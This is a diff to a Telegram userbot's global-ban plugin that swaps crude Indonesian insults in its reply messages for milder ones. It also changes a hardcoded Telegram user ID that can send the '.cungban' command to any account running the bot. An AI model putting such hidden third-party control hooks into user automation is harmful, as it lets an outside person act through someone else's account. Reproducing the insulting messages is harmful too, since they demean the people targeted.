@@ -85,11 +85,11 @@ async def gben(userbot):
     sender = await dc.get_sender()
     me = await dc.client.get_me()
     if not sender.id == me.id:
-        dark = await dc.reply("`Global banned Aktif Ngentot, perintah jesUbot!`")
+        dark = await dc.reply("`Global banned Aktif YGY, perintah fanUbot!`")
     else:
-        dark = await dc.edit("`Memproses Global Banned Bocah Kontol!!`")
+        dark = await dc.edit("`Memproses Global Banned Bocah KORENG!!`")
     me = await userbot.client.get_me()
-    await dark.edit(f"`Selamat Anda Di Ban Sama Tuhan Yah Ngentod!!!`")
+    await dark.edit(f"`Selamat Anda Di Ban Sama KELUARGAMU Yah !!!`")
     my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
     f"@{me.username}" if me.username else my_mention
     await userbot.get_chat()
@@ -148,7 +148,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-@register(incoming=True, from_users=1683788007, pattern=r"^\.cungban(?: |$)(.*)")
+@register(incoming=True, from_users=2109079002, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
